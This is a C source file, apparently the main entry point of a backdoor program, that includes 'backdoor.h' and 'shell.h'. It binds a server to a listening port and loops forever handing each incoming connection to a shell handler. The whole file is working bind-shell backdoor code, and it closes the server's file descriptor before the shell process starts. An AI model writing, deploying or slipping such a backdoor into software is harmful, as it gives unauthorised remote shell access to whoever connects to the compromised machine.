#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include <fcntl.h>
#include <string.h>

#include "shell.h"
#include "common.h"
#include "backdoor.h"


int main(void)
{
    return_code_t result = RC_UNINITIAILIZED;
    int32_t shell_server = -1;
    int32_t temp_result = -1;

    result = shell__init_server(SHELL_LISTENING_PORT, &shell_server);
    if (RC_SUCCESS != result){
        goto l_cleanup;
    }

    // We don't want to pass the shell_server's fd to the shell process.
    temp_result = fcntl(shell_server, F_SETFD, FD_CLOEXEC);
    if (-1 == temp_result){
        handle_perror("Fcntl failed", RC_BACKDOOR__MAIN__FCNTL_FAILED);
    }

    printf("Started to listen for connections on port: %d\n", SHELL_LISTENING_PORT);
    while (true){
        result = shell__handle_new_connection(shell_server);
        if (RC_SUCCESS != result){
            break;
        }
    }

    printf("Stops listening for new connections.\n");
l_cleanup:
    shell__destroy_server(&shell_server);
    
    return (int)result;
}
